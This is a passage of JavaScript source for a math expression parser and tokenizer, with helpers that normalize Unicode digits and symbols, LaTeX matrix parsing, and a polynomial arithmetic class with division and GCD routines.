      numerator = Expression.Integer.fromString(integerPart);
    }
    if (nonRepeatingFractionalPart != undefined) {
      var factor = Expression.pow(Expression.TEN, nonRepeatingFractionalPart.length);
      numerator = numerator.multiply(factor).add(Expression.Integer.fromString(nonRepeatingFractionalPart));
      denominator = denominator.multiply(factor);
    }
    if (repeatingFractionalPart != undefined) {
      var factor = Expression.pow(Expression.TEN, repeatingFractionalPart.length).subtract(Expression.ONE);
      numerator = numerator.multiply(factor).add(Expression.Integer.fromString(repeatingFractionalPart));
      denominator = denominator.multiply(factor);
    }
    if (exponentPart != undefined) {
      var exponent = 0 + Number.parseInt(exponentPart, 10);
      var factor = Expression.pow(Expression.TEN, exponent < 0 ? -exponent : exponent);
      if (exponent < 0) {
        denominator = denominator.multiply(factor);
      } else {
        numerator = numerator.multiply(factor);
      }
    }

    var value = numerator.divide(denominator);
    return value;
  };

  var parseDecimalFraction = function (tokenizer, token, context) {
    var isOnlyInteger = true;
    var result = undefined;
    if (token.type === 'integerLiteral') {
      result = Expression.Integer.fromString(token.value);
      result = context.wrap(result);
      token = nextToken(tokenizer);
    } else if (token.type === 'numericLiteral') {
      var value = token.value;
      //var match = token.match;
      var match = decimalFractionWithGroups.exec(value);
      isOnlyInteger = false;
      result = getDecimalFraction(match[1], match[2], match[3], match[4]);
      result = context.wrap(result);
      token = nextToken(tokenizer);
    }
    //!
    if (isOnlyInteger || result == undefined) {
      if (token.type === 'vulgarFraction') {
        var fraction = context.wrap(getVulgarFraction(token.value, context));
        if (result != undefined) {
          result = ADDITION.i(result, fraction).addPosition(tokenizer.position - token.value.length, ADDITION.name.length, tokenizer.input);
        } else {
          result = fraction;
        }
        token = nextToken(tokenizer);
      }
    }
    return result != undefined ? new ParseResult(result, token) : undefined;
  };

  // TODO: sticky flags - /\s+/y
  var whiteSpaces = /^\s+/;
  var punctuators = /^(?:[,&(){}|]|\\\\|(?:\\begin|\\end)(?:\{[bvp]?matrix\})?)/;
  var integerLiteral = /^\d+(?![\d.,eE])/; // for performance
  var integerLiteralWithoutComma = /^\d+(?![\d.eE])/; // for performance
  var decimalFraction = /^(?=[.,]?\d)\d*(?:[.,]\d*(?:\(\d+\))?)?(?:[eE][\+\-]?\d+)?/;
  var decimalFractionWithoutComma = /^(?=[.]?\d)\d*(?:[.]\d*(?:\(\d+\))?)?(?:[eE][\+\-]?\d+)?/;
  // Base Latin, Base Latin upper case, Base Cyrillic, Base Cyrillic upper case, Greek alphabet
  var symbols = /^(?:alpha|beta|gamma|delta|epsilon|zeta|eta|theta|iota|kappa|lambda|mu|nu|xi|omicron|pi|rho|varsigma|sigma|tau|upsilon|phi|chi|psi|omega|circ|[a-zA-Z\u0430-\u044F\u0410-\u042F\u03B1-\u03C9])(?:\_\d+|\_\([a-z\d]+,[a-z\d]+\)|[\u2080-\u2089]+)?/;
  var superscripts = /^[\u00B2\u00B3\u00B9\u2070\u2074-\u2079]+/; // superscript digits 2310456789
  var vulgarFractions = /^[\u00BC-\u00BE\u2150-\u215E]/;
  var other = /^\S/;

  var decimalFractionWithGroups = /^(\d*)(?:[.,](\d+)?(?:\((\d+)\))?)?(?:[eE]([\+\-]?\d+))?$/;

  // s.normalize("NFKD").replace(/[\u2044]/g, "/")
  var normalizeSuperscripts = function (s) {
    return s.replace(/[\u00B2\u00B3\u00B9\u2070\u2074-\u2079]/g, function (c) {
      var charCode = c.charCodeAt(0);
      if (charCode === 0x00B2) {
        return "2";
      }
      if (charCode === 0x00B3) {
        return "3";
      }
      if (charCode === 0x00B9) {
        return "1";
      }
      return (charCode - 0x2074 + 4).toString();
    });
  };

  var normalizeVulgarFractions = function (s) {
    return s.replace(/[\u00BC-\u00BE\u2150-\u215E]/g, function (c) {
      var charCode = c.charCodeAt(0);
      var i = charCode - 0x2150 < 0 ? (charCode - 0x00BC) * 2 : (3 + charCode - 0x2150) * 2;
      return "141234171911132315253545165618385878".slice(i, i + 2).replace(/^\S/g, "$&/").replace(/1\/1/g, "1/10");
    });
  };

  var normalizeSubscripts = function (s) {
    var i = s.length - 1;
    while (i >= 0 && s.charCodeAt(i) >= 0x2080) {
      i -= 1;
    }
    return i === s.length - 1 ? s : s.slice(0, i + 1) + "_" + s.slice(i + 1).replace(/[\u2080-\u2089]/g, function (c) {
      return String.fromCharCode(c.charCodeAt(0) - 0x2080 + "0".charCodeAt(0));
    });
  };

  var normalizeGreek = function (s) {
    var i = s.indexOf("_");
    var k = i === -1 ? s.length : i;
    if (k > 1) {
      var name = s.slice(0, k);
      var greek = " alpha beta gamma delta epsilon zeta eta theta iota kappa lambda mu nu xi omicron pi rho varsigma sigma tau upsilon phi chi psi omega ";
      var j = greek.indexOf(" " + name + " ");
      if (j !== -1) {
        return String.fromCharCode(0x03B1 + greek.slice(0, j).split(" ").length - 1) + s.slice(k);
      }
    }
    return s;
  };

  var parseExpression = function (tokenizer, token, context, precedence, left) {
    var ok = true;
    var isDecimalFraction = false;
    var tmp = undefined;
    var right = undefined;
    //!

    while (token.type !== 'EOF' && ok) {
      var op = undefined;
      var operand = undefined;

        var bestMatch = token.type === 'operator' ? operationSearchCache.getByName(token.value) : null;
        if (bestMatch != null) {
          op = left == null && bestMatch.name === '+' ? UNARY_PLUS : (left == null && bestMatch.name === '-' ? UNARY_MINUS : bestMatch);
        }
        //  if (Input.startsWith(input, position, '\\begin') || Input.startsWith(input, position, '\\end')) {
        //    op = null;
        //  }

      //if (op != null && op.name === "\\" && Input.startsWith(input, position, "\\\\")) {
      //  if (isMatrixElement) {//TODO: optimize
      //    op = null;
        //} else if (Input.startsWith(input, position + 1, "begin") || Input.startsWith(input, position + 1, "left")) {
        //  op = null;
      //  }
      //}

      if (op != null && op.name === "frac") { // !isAlpha(Input.getFirst(input, position + "frac".length))
        if (!(left == null && precedence <= UNARY_PRECEDENCE_PLUS_ONE || precedence < MULTIPLICATION.precedence)) {
          ok = false;
        } else {
        // https://en.wikipedia.org/wiki/Operand#Positioning_of_operands - prefix notation

        token = nextToken(tokenizer);
        tmp = parseExpression(tokenizer, token, context, MULTIPLICATION.precedence, undefined);
        var a = tmp.result;
        token = tmp.token;
        tmp = parseExpression(tokenizer, token, context, MULTIPLICATION.precedence, undefined);
        var b = tmp.result;
        token = tmp.token;
        // addPosition - ?
        operand = op.i(a, b);
        ok = true;
        }
      } else if (op != undefined) {
        // TODO: check if the checks are needed (tests - ?)
        if (!(left != undefined && (op.arity !== 1 || op.rightToLeftAssociative !== RIGHT_TO_LEFT || precedence < MULTIPLICATION.precedence) ||
              left == undefined && op.arity === 1 && op.rightToLeftAssociative === RIGHT_TO_LEFT) ||
            //!(!candidate.xyz || !isAlpha(Input.getFirst(input, position + candidate.name.length))) ||//TODO: fix - ExpressionParser.parse("George")
            precedence > op.precedence + (op.rightToLeftAssociative === RIGHT_TO_LEFT ? 0 : -1)) {
          ok = false;
        } else {
          var operatorPosition = tokenizer.position - token.value.length;
          token = nextToken(tokenizer);
          if (op.arity === 1 && op.rightToLeftAssociative !== RIGHT_TO_LEFT) {
            //TODO: fix
            ExpressionParser.startPosition = operatorPosition;
            ExpressionParser.endPosition = operatorPosition + op.name.length;
            ExpressionParser.input = tokenizer.input;
            left = op.i(left).addPosition(operatorPosition, op.name.length, tokenizer.input);
          } else {
            if (op.arity === 1 && op.rightToLeftAssociative === RIGHT_TO_LEFT && op.precedence === UNARY_PRECEDENCE_PLUS_ONE && op.name.length > 1 &&
                (op.name === "sin" || op.name === "cos" || op.name === "sen" || op.name === "tan" || op.name === "tg") &&
                (token.type === 'operator' && token.value === EXPONENTIATION.name || token.type === 'superscript')) {
              // https://en.wikipedia.org/wiki/Exponentiation#Exponential_notation_for_function_names

              // cos^2(x)
              //!new 2017-11-04
              // parse an operator for the exponentiation
              var exponentiationPosition = tokenizer.position;

              var exponentiationLength = 0;
              var middle = null;
              if (token.type === 'superscript') {
                var superscript = token.value;
                exponentiationLength = token.value.length;
                token = nextToken(tokenizer);
                middle = Expression.Integer.fromString(normalizeSuperscripts(superscript));
              } else {
                exponentiationLength = EXPONENTIATION.name.length;
                token = nextToken(tokenizer);
                if (token.type !== 'integerLiteral') {
                  ok = false;
                } else {
                  tmp = parseExpression(tokenizer, token, context, EXPONENTIATION.precedence, undefined);
                  middle = tmp.result;
                  token = tmp.token;
                }
              }
              if (ok) {
                // parse an operator for the current operator
                tmp = parseExpression(tokenizer, token, context, op.precedence, undefined);
                right = tmp.result;
                token = tmp.token;
                operand = EXPONENTIATION.i(op.i(right).addPosition(operatorPosition, op.name.length, tokenizer.input), middle).addPosition(exponentiationPosition, exponentiationLength, tokenizer.input);
              }
            } else {
              tmp = parseExpression(tokenizer, token, context, op.precedence, undefined);
              right = tmp.result;
              token = tmp.token;
              //TODO: fix `1/(2-2)`
              ExpressionParser.startPosition = operatorPosition;
              ExpressionParser.endPosition = operatorPosition + op.name.length;
              ExpressionParser.input = tokenizer.input;
              if (op.arity === 1) {
                // left <implicit multiplication> operand
                operand = op.i(right).addPosition(operatorPosition, op.name.length, tokenizer.input);
              } else if (op.arity === 2) {
                left = op.i(left, right).addPosition(operatorPosition, op.name.length, tokenizer.input);
              } else {
                throw new RangeError();
              }
            }
          }
        }
      } else if (left == undefined || precedence < MULTIPLICATION.precedence || (precedence === UNARY_PRECEDENCE_PLUS_ONE && isDecimalFraction && token.type === 'symbol')) {
        if ((tmp = parseDecimalFraction(tokenizer, token, context)) != undefined) {
          operand = tmp.result;
          token = tmp.token;
          isDecimalFraction = true;
        } else if (token.type === 'punctuator' && token.value === "(") {
          token = parsePunctuator(tokenizer, token, "(");
          tmp = parseExpression(tokenizer, token, context, 0, undefined);
          operand = tmp.result;
          token = tmp.token;
          token = parsePunctuator(tokenizer, token, ")");
        } else if (token.type === 'punctuator' && token.value === "{") {
          token = parsePunctuator(tokenizer, token, "{");
          if (token.type === 'punctuator' && token.value === "{") {
            tmp = parseMatrix(tokenizer, token, context);
            operand = tmp.result;
            token = tmp.token;
          } else {
            tmp = parseLaTeXArgument(tokenizer, token, context);
            operand = tmp.result;
            token = tmp.token;
            token = parsePunctuator(tokenizer, token, "}");
          }
        } else if (token.type === 'punctuator' && (token.value === "\\begin{bmatrix}" ||
                                                   token.value === "\\begin{vmatrix}" ||
                                                   token.value === "\\begin{pmatrix}" ||
                                                   token.value === "\\begin{matrix}")) {
          var kind = token.value.slice('\\begin{'.length, -1);
          tmp = parseLaTeXMatrix(tokenizer, token, context, kind);
          operand = tmp.result;
          token = tmp.token;
          if (kind === 'vmatrix') {
            operand = operand.determinant();//!
          }
        } else if (token.type === 'symbol') {
          var symbolName = token.value;
          symbolName = normalizeSubscripts(symbolName);
          symbolName = normalizeGreek(symbolName);
          operand = context.get(symbolName);
          operand = context.wrap(operand);
          token = nextToken(tokenizer);
        } else if (token.type === 'punctuator' && token.value === "|" && left == undefined) {
          token = parsePunctuator(tokenizer, token, "|");
          tmp = parseExpression(tokenizer, token, context, 0, undefined);
          operand = tmp.result;
          token = tmp.token;
          token = parsePunctuator(tokenizer, token, "|");
          
          operand = operand.determinant();//!
        } else {
          ok = false;
        }
      } else {
        ok = false;
      }

      //!TODO: fix
      if (!ok && left != undefined && precedence <= EXPONENTIATION.precedence + (EXPONENTIATION.rightToLeftAssociative === RIGHT_TO_LEFT ? 0 : -1)) {
        if (token.type === 'superscript') {
          // implicit exponentiation
          //TODO: check position
          var superscript = token.value;
          left = EXPONENTIATION.i(left, Expression.Integer.fromString(normalizeSuperscripts(superscript))).addPosition(tokenizer.position - token.value.length, EXPONENTIATION.name.length, tokenizer.input);
          token = nextToken(tokenizer);
          ok = true;//!
        }
      }

      if (!ok && token.type === 'operator' && token.value === "\\") { // isAlpha(Input.getFirst(input, position + 1))
        // TODO: LaTeX - ?
        ok = true;
        token = nextToken(tokenizer);
      }

      if (operand != undefined) {
        if (left != undefined) {
          // implied multiplication
          var oldPosition = tokenizer.position;
          tmp = parseExpression(tokenizer, token, context, MULTIPLICATION.precedence, operand);
          var right1 = tmp.result;
          token = tmp.token;
          left = MULTIPLICATION.i(left, right1).addPosition(oldPosition, MULTIPLICATION.name.length, tokenizer.input);
        } else {
          left = operand;
        }
      }
    }

    if (left == undefined) {
      ExpressionParser.startPosition = tokenizer.position - token.value.length;
      ExpressionParser.endPosition = tokenizer.position;
      ExpressionParser.input = tokenizer.input;
      if (token.type === 'EOF') {
        throw new RangeError("UserError: unexpected end of input");//TODO: fix
      }
      //TODO: ?
      throw new RangeError("UserError: unexpected '" + token.value + "'");//TODO: fix
    }
    return new ParseResult(left, token);
  };

  var replaceHanidec = function (code) {
    switch (code) {
      case 0x3007: return 0;
      case 0x4E00: return 1;
      case 0x4E8C: return 2;
      case 0x4E09: return 3;
      case 0x56DB: return 4;
      case 0x4E94: return 5;
      case 0x516D: return 6;
      case 0x4E03: return 7;
      case 0x516B: return 8;
      case 0x4E5D: return 9;
    }
    return -1;
  };

  // https://www.ecma-international.org/ecma-402/5.0/index.html#table-numbering-system-digits
  // TODO: remove or add tests
  var replaceSimpleDigit = function (code) {
    if (code >= 0x0660 && code <= 0x0669) {
      return {code: code - 0x0660 + 0x0030, name: "arab"};
    }
    if (code >= 0x06F0 && code <= 0x06F9) {
      return {code: code - 0x06F0 + 0x0030, name: "arabext"};
    }
    if (code >= 0x0966 && code <= 0x096F) {
      return {code: code - 0x0966 + 0x0030, name: "deva"};
    }
    if (code >= 0x09E6 && code <= 0x09EF) {
      return {code: code - 0x09E6 + 0x0030, name: "beng"};
    }
    if (code >= 0x0A66 && code <= 0x0A6F) {
      return {code: code - 0x0A66 + 0x0030, name: "guru"};
    }
    if (code >= 0x0AE6 && code <= 0x0AEF) {
      return {code: code - 0x0AE6 + 0x0030, name: "gujr"};
    }
    if (code >= 0x0B66 && code <= 0x0B6F) {
      return {code: code - 0x0B66 + 0x0030, name: "orya"};
    }
    if (code >= 0x0BE6 && code <= 0x0BEF) {
      return {code: code - 0x0BE6 + 0x0030, name: "tamldec"};
    }
    if (code >= 0x0C66 && code <= 0x0C6F) {
      return {code: code - 0x0C66 + 0x0030, name: "telu"};
    }
    if (code >= 0x0CE6 && code <= 0x0CEF) {
      return {code: code - 0x0CE6 + 0x0030, name: "knda"};
    }
    if (code >= 0x0D66 && code <= 0x0D6F) {
      return {code: code - 0x0D66 + 0x0030, name: "mlym"};
    }
    if (code >= 0x0E50 && code <= 0x0E59) {
      return {code: code - 0x0E50 + 0x0030, name: "thai"};
    }
    if (code >= 0x0ED0 && code <= 0x0ED9) {
      return {code: code - 0x0ED0 + 0x0030, name: "laoo"};
    }
    if (code >= 0x0F20 && code <= 0x0F29) {
      return {code: code - 0x0F20 + 0x0030, name: "tibt"};
    }
    if (code >= 0x1040 && code <= 0x1049) {
      return {code: code - 0x1040 + 0x0030, name: "mymr"};
    }
    if (code >= 0x17E0 && code <= 0x17E9) {
      return {code: code - 0x17E0 + 0x0030, name: "khmr"};
    }
    if (code >= 0x1810 && code <= 0x1819) {
      return {code: code - 0x1810 + 0x0030, name: "mong"};
    }
    if (code >= 0x1946 && code <= 0x194F) {
      return {code: code - 0x1946 + 0x0030, name: "limb"};
    }
    if (code >= 0x1B50 && code <= 0x1B59) {
      return {code: code - 0x1B50 + 0x0030, name: "bali"};
    }
    if (code >= 0xFF10 && code <= 0xFF19) {
      return {code: code - 0xFF10 + 0x0030, name: "fullwide"};
    }
    var c = replaceHanidec(code);
    if (c !== -1) {
      return {code: '0'.charCodeAt(0) + c, name: "hanidec"};
    }
    return undefined;
  };

  var getCharCodeReplacement = function (charCode) {
    if (charCode === 0x0410 || charCode === 0x0430) {
      return "A";
    }
    if (charCode === 0x0412 || charCode === 0x0432) {
      return "B";
    }
    if (charCode === 0x0421 || charCode === 0x0441) {
      return "C";
    }
    //if (charCode === 0x0425 || charCode === 0x0445) {
    //  return "X";
    //}
    if (charCode === 0x0422 || charCode === 0x0442) {
      return "T";
    }
    if (charCode === 0x2212) {
      return "-";
    }
    if (charCode >= 0x2010 && charCode <= 0x2015) {
      return "-";
    }
    if (charCode === 0x00B7 || charCode === 0x00D7 || charCode === 0x2022 || charCode === 0x22C5) {
      return "*";
    }
    // 0x003A - Deutsch
    if (charCode === 0x003A || charCode === 0x00F7) {
      return "/";
    }
    if (charCode >= 0xFF01 && charCode <= 0xFF5E) {
      // normalize full-widht forms:
      return String.fromCharCode(charCode - 0xFF01 + 0x0021);
    }
    if (charCode === 0x060C || charCode === 0x066B) {
      return ",";
    }
    var y = replaceSimpleDigit(charCode);
    if (y != undefined) {
      // TODO: remove
      if (typeof hit === "function") {
        hit({digit: y.name});
      }
      return String.fromCharCode(y.code);
    }
    if (charCode === 0x2147) {
      return "e";
    }
    if (charCode === 0x2148) {
      return "i";
    }
    if (charCode === 0x2215) {
      return "/";
    }
    if (charCode === 0x2713) {
      return "\u221A";
    }
    if (charCode === 0x2061) {
      return " ";
    }
    if (charCode === 0x2062) {
      return "*";
    }
    if (charCode === 0x2063) {
      return ",";
    }
    return undefined;
  };
  //var replaceRegExp = /[...]/g;
  //var replaceFunction = function (c) {
  //  return getCharCodeReplacement(c.charCodeAt(0));
  //};
  //input = input.replace(replaceRegExp, replaceFunction); - slow in Chrome
  var replaceSomeChars = function (input) {
    var lastIndex = 0;
    var result = '';
    for (var i = 0; i < input.length; i += 1) {
      var charCode = input.charCodeAt(i);
      if (charCode > 0x007F || charCode === 0x003A) {
        var x = getCharCodeReplacement(charCode);
        if (x != undefined) {
          result += input.slice(lastIndex, i);
          result += x;
          lastIndex = i + 1;
        }
      }
    }
    result += input.slice(lastIndex);
    return result;
  };

  var config = [
    {type: 'integerLiteral', re: null},
    {type: 'numericLiteral', re: null},
    {type: 'whitespace', re: whiteSpaces},
    {type: 'punctuator', re: punctuators},
    {type: 'operator', re: null},
    {type: 'symbol', re: symbols},
    {type: 'vulgarFraction', re: vulgarFractions},
    {type: 'superscript', re: superscripts},
    {type: 'OTHER', re: other}
  ];

  function Token(type, value) {
    this.type = type;
    this.value = value;
  }

  Token.EOF = new Token('EOF', '', null);

  function Tokenizer(input, position, states) {
    this.input = input;
    this.position = position;
    this.states = states;
  }

  Tokenizer.prototype.next = function () {
    if (this.position >= this.input.length) {
      return Token.EOF;
    }
    // iteration by object keys is slower (?)
    for (var i = 0; i < config.length; i += 1) {
      var c = config[i];
      var type = c.type;
      var re = c.re;
      if (re == null) {
        if (type === 'integerLiteral') {
          if (this.states != null && this.states.value === '{}') {
            re = integerLiteralWithoutComma;
          } else {
            re = integerLiteral;
          }
        } else if (type === 'numericLiteral') {
          if (this.states != null && this.states.value === '{}') {
            re = decimalFractionWithoutComma;
          } else {
            re = decimalFraction;
          }
        } else if (type === 'operator') {
          re = operationSearchCache.getRegExp();//?TODO: 
        }
      }
      var tmp = re.exec(this.input.slice(this.position));
      if (tmp != null) {
        var value = tmp[0];
        if (type === 'punctuator') {
          if (value === '(') {
            this.states = {previous: this.states, value: '()'};
          } else if (value === ')') {
            if (this.states != null && this.states.value === '()') {
              this.states = this.states.previous;
            }
          } else if (value === '{') {
            this.states = {previous: this.states, value: '{}'};
          } else if (value === '}') {
            if (this.states != null && this.states.value === '{}') {
              this.states = this.states.previous;
            }
          }
        }
        this.position += value.length;
        return new Token(type, value);
      }
    }
    throw new TypeError();
  };

  var fs = {};//!TODO: remove!!!

  function ExpressionParser() {
  }

  ExpressionParser.parse = function (input, context) {
    context = context == undefined ? new ExpressionParser.Context(undefined, false) : context;

    ExpressionParser.startPosition = -1;
    ExpressionParser.endPosition = -1;
    ExpressionParser.input = input; //?

    // TODO: remove
    if (typeof input !== "string") {
      throw new RangeError();
    }

    //TODO: fix ???
    input = replaceSomeChars(input);

    if (typeof hit === "function" && context.getter != undefined) {
      var re = /[a-z][a-z][a-z\-]+/gi;
      var m = null;
      while ((m = re.exec(input)) != null) {
        var t = m[0];
        if (!(t in fs) && t.indexOf("-") === -1) {
          fs[t] = true;
          hit({fs: t});
        }
      }
    }

    var tokenizer = new Tokenizer(input, 0, null);
    var token = nextToken(tokenizer);
    var tmp = parseExpression(tokenizer, token, context, 0, undefined);
    token = tmp.token;
    if (token.type !== 'EOF') {
      ExpressionParser.startPosition = tokenizer.position - token.value.length;
      ExpressionParser.endPosition = tokenizer.position;
      ExpressionParser.input = input;
      throw new RangeError("UserError: unexpected '" + token.value + "'");
    }

    return tmp.result;
  };
  
  globalThis.Tokenizer = Tokenizer;

  ExpressionParser.startPosition = -1;
  ExpressionParser.endPosition = -1;
  ExpressionParser.input = "";

  var getConstant = function (symbolName) {
    if (symbolName === "pi" || symbolName === "\u03C0") {
      return Expression.PI;
    }
    if (symbolName === "e") {
      return Expression.E;
    }
    if (symbolName === "i") {
      return Expression.I;
    }
    if (symbolName === "I" || symbolName === "U" || symbolName === "E") {
      return new Expression.IdentityMatrix(symbolName);
    }
    if (symbolName === "circ") { //TODO: ○ - ?
      return Expression.CIRCLE;
    }
    return new Expression.Symbol(symbolName);
  };

  ExpressionParser.Context = function (getter, needsWrap) {
    this.getter = getter;
    this.needsWrap = needsWrap == undefined ? true : needsWrap;
  };
  ExpressionParser.Context.prototype.get = function (symbolName) {
    if (this.getter != undefined) {
      var x = this.getter(symbolName);
      if (x != undefined) {
        return x;
      }
    }
    return getConstant(symbolName);
  };
  ExpressionParser.Context.prototype.wrap = function (e) {
    if (!this.needsWrap) {
      return e;
    }
    return new Expression.NonSimplifiedExpression(e);
  };

  ExpressionParser.addOperation = function (denotation, arity) {
    var newOperation = arity === 1 ? new Operator(denotation, arity, RIGHT_TO_LEFT, UNARY_PRECEDENCE, function (a) {
      return a.transformNoAnswerExpression(denotation);
    }) : new Operator(denotation, arity, RIGHT_TO_LEFT, MULTIPLICATIVE_PRECEDENCE, function (a, b) {
      return a.transformNoAnswerExpression(denotation, b);
    });
    //operations.push(newOperation);
    operationSearchCache.append(newOperation);
  };

  ExpressionParser.addDenotations = function (denotationsByOperation) {
    for (var operationName in denotationsByOperation) {
      if (Object.prototype.hasOwnProperty.call(denotationsByOperation, operationName)) {
        var denotations = denotationsByOperation[operationName];
        var operation = operationSearchCache.getByName(operationName);
        var added = {};
        added[operationName] = true;
        for (var key in denotations) {
          if (Object.prototype.hasOwnProperty.call(denotations, key)) {
            var denotation = denotations[key];
            if (added[denotation] == undefined) {
              added[denotation] = true;
              var newOperation = new Operator(denotation, operation.arity, operation.rightToLeftAssociative, operation.precedence, operation.i);
              //operations.push(newOperation);
              operationSearchCache.append(newOperation);
            }
          }
        }
      }
    }
  };

  self.ExpressionParser = ExpressionParser;

})();
(function () {
"use strict";
  
  

  function PolynomialTerm(degree, coefficient) {
    if (degree < 0) {
      throw new RangeError();
    }
    if (degree > 9007199254740991) {
      throw new RangeError("NotSupportedError");
    }
    if (coefficient.equals(Expression.ZERO)) {
      throw new RangeError();
    }
    this.degree = degree;
    this.coefficient = coefficient;
  }
  function PolynomialData(length) {
    this.array = new Array(length);
    this.i = 0;
    this.length = length; // public
  }
  PolynomialData.prototype.add = function (degree, coefficient) {
    var k = this.i;
    if (k >= this.length) {
      throw new RangeError();
    }
    this.array[k] = new PolynomialTerm(degree, coefficient);
    this.i = k + 1;
  };
  PolynomialData.prototype.degree = function (i) {
    return this.array[i].degree;
  };
  PolynomialData.prototype.coefficient = function (i) {
    return this.array[i].coefficient;
  };
  PolynomialData.prototype.trim = function () {
    if (this.i !== this.length) {
      var array = new Array(this.i);
      for (var i = 0; i < this.i; i += 1) {
        array[i] = this.array[i];
      }
      this.array = array;
      this.length = this.i;
    }
    return this;
  };
  PolynomialData.prototype.getCoefficient = function (degree) {
    var from = 0;
    var to = this.array.length;
    while (from < to) {
      var middle = from + Math.floor((to - from) / 2);
      var y = this.array[middle].degree;
      if (y < degree) {
        from = middle + 1;
      } else if (y > degree) {
        to = middle;
      } else {
        return this.array[middle].coefficient;
      }
    }
    return Expression.ZERO;
  };

  // Polynomial([a0, a1, a2, ...., an]);
  // an*x^n+ an-1 x ^n-1 +... + a0
  function Polynomial(a) {
    this.a = a;
  }

  Polynomial.of = function () {
    var newData = new PolynomialData(arguments.length);
    for (var i = 0; i < arguments.length; i += 1) {
      var a = arguments[i];
      if (!a.equals(Expression.ZERO)) {
        newData.add(i, a);
      }
    }
    return new Polynomial(newData.trim());
  };
  Polynomial.from = function (array) {
    var newData = new PolynomialData(array.length);
    for (var i = 0; i < array.length; i += 1) {
      var a = array[i];
      if (!a.equals(Expression.ZERO)) {
        newData.add(i, a);
      }
    }
    return new Polynomial(newData.trim());
  };

  Polynomial.ZERO = Polynomial.of();

  Polynomial.prototype.getDegree = function () {
    return this.a.length === 0 ? -1 : this.a.degree(this.a.length - 1);
  };
  Polynomial.prototype.getCoefficient = function (degree) {
    if (degree > this.getDegree()) {
      throw new RangeError();
    }
    return this.a.getCoefficient(degree);
  };
  Polynomial.prototype.getLeadingCoefficient = function () {
    return this.a.length === 0 ? Expression.ZERO : this.a.coefficient(this.a.length - 1);
  };

  Polynomial.prototype.map = function (mapFunction) {//?
    var newData = new PolynomialData(this.a.length);
    for (var i = 0; i < this.a.length; i += 1) {
      var coefficient = this.a.coefficient(i);
      var degree = this.a.degree(i);
      var c = mapFunction(coefficient, degree);
      if (!c.equals(Expression.ZERO)) {
        newData.add(degree, c);
      }
    }
    return new Polynomial(newData.trim());
  };

  Polynomial.prototype.equals = function (p) {
    var i = this.a.length;
    if (i !== p.a.length) {
      return false;
    }
    while (--i >= 0) {
      if (this.a.degree(i) !== p.a.degree(i) || !this.a.coefficient(i).equals(p.a.coefficient(i))) {
        return false;
      }
    }
    return true;
  };

  Polynomial.prototype.add = function (p) {
    var i = 0;
    var j = 0;
    var newData = new PolynomialData(this.a.length + p.a.length);
    while (i < this.a.length && j < p.a.length) {
      var x = this.a.degree(i);
      var y = p.a.degree(j);
      if (x < y) {
        newData.add(x, this.a.coefficient(i));
        i += 1;
      } else if (x > y) {
        newData.add(y, p.a.coefficient(j));
        j += 1;
      } else {
        var c = this.a.coefficient(i).add(p.a.coefficient(j));
        if (!c.equals(Expression.ZERO)) {
          newData.add(x, c);
        }
        i += 1;
        j += 1;
      }
    }
    while (i < this.a.length) {
      newData.add(this.a.degree(i), this.a.coefficient(i));
      i += 1;
    }
    while (j < p.a.length) {
      newData.add(p.a.degree(j), p.a.coefficient(j));
      j += 1;
    }
    return new Polynomial(newData.trim());
  };

  Polynomial.prototype.multiply = function (p) {
    if (this.a.length === 0 || p.a.length === 0) {
      return Polynomial.ZERO;
    }
    var result = Polynomial.ZERO;
    for (var i = 0; i < this.a.length; i += 1) {
      var xd = this.a.degree(i);
      var xc = this.a.coefficient(i);
      var newData = new PolynomialData(p.a.length);
      for (var j = 0; j < p.a.length; j += 1) {
        var yd = p.a.degree(j);
        var yc = p.a.coefficient(j);
        newData.add(xd + yd, xc.multiply(yc));
      }
      result = result.add(new Polynomial(newData.trim()));
    }
    return result;
  };

  Polynomial.prototype.shift = function (n) { // *= x**n, n >= 0
    if (n < 0) {
      throw new TypeError();
    }
    var newData = new PolynomialData(this.a.length);
    for (var i = 0; i < this.a.length; i += 1) {
      newData.add(this.a.degree(i) + n, this.a.coefficient(i));
    }
    return new Polynomial(newData.trim());
  };

  Polynomial.prototype.divideAndRemainder = function (p, w) {
    w = w || undefined;
    if (p.equals(Polynomial.ZERO)) {
      throw new RangeError("ArithmeticException");
    }
    var quotient = Polynomial.ZERO;
    var remainder = this;
    while (remainder.getDegree() >= p.getDegree()) {
      var n = remainder.getDegree() - p.getDegree();
      var lcr = remainder.getLeadingCoefficient();
      var lcp = p.getLeadingCoefficient();
      var q = lcr.divide(lcp);
      if (w != undefined) {
        if (q instanceof Expression.Division) {
          if (w === "throw") {
            throw new RangeError(); // AssertionError
          }
          if (w === "undefined") {
            return undefined;
          }
          throw new RangeError();
        }
      }
      var pq = Polynomial.of(q);
      quotient = quotient.add(pq.shift(n));
      remainder = remainder.subtract(p.multiply(pq).shift(n));
      if (remainder.getDegree() - p.getDegree() === n) {
        // to avoid the infite loop
        throw new TypeError("there is a some problem with the expression evaluation");//!
      }
    }
    return {quotient: quotient, remainder: remainder};
  };

  Polynomial.pseudoRemainder = function (x, y) {
    var lcg = y.getLeadingCoefficient();
    var n = x.getDegree() - y.getDegree();
    // assertion
    if (n < 0) {
      throw new RangeError();
    }
    var sx = x.multiply(Polynomial.of(Expression.pow(lcg, n).multiply(lcg)));
    return sx.divideAndRemainder(y, "throw").remainder;
  };

  Polynomial.polynomialGCD = function (a, b) {
    //TODO: fix (place condition for degrees earlier - ?)
    if (a.getDegree() < b.getDegree()) {
      //!!!
      var tmp = a;
      a = b;
      b = tmp;
    }

    var contentA = a.getContent();
    var contentB = b.getContent();
    var ppA = a.divideAndRemainder(Polynomial.of(contentA), "throw").quotient;
    var ppB = b.divideAndRemainder(Polynomial.of(contentB), "throw").quotient;
    var A = ppA;
    var B = ppB;
    while (!B.equals(Polynomial.ZERO)) {
      var r = Polynomial.pseudoRemainder(A, B);
      //! 2018-05-12
      if (!r.equals(Polynomial.ZERO)) {
        // https://en.wikipedia.org/wiki/Polynomial_greatest_common_divisor#Primitive_pseudo-remainder_sequence
        // ExpressionParser.parse("(x^8+x^6-3x^4-3x^3+8x^2+2x-5)/(3x^6+5x^4-4x^2-9x+21)")
        r = r.divideAndRemainder(Polynomial.of(r.getContent()), "throw").quotient;
        //console.log(r.toString());
      }
      //!
      A = B;
      B = r;
    }
    var c = contentA.gcd(contentB);
    return Polynomial.of(c).multiply(A.divideAndRemainder(Polynomial.of(A.getContent()), "throw").quotient);
  };

  Polynomial.prototype.calcAt = function (point) {//!!!
    var n = Expression.ZERO;
    var lastDegree = -1;
    var i = this.a.length;
    while (--i >= -1) {
      var degree = i === -1 ? 0 : this.a.degree(i);
